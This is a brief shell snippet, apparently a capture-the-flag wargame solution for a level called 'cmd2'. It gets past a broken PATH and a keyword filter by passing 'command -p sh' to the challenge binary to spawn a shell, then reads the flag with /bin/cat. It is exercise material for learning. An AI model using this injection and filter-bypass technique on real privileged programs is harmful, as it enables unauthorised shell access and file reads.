# PATH is busted and there's some filtering
# instead use the sh builtin `command` to
# run the command. -p builds an environment
# for you
./cmd2 'command -p sh'
# now you can just /bin/cat flag
